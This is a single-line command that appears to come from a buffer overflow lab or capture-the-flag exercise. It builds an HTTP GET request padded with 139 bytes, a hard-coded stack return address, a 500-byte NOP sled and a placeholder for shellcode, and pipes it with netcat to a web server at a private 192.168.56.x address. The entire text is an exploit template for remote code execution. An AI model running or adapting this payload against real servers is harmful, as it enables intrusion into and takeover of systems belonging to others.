python -c 'print "GET "+"a"*139+"\x40\xf4\xff\xbf HTTP/1.1"+"\x90"*500 + SHELLCODE "'| nc 192.168.56.37 20000
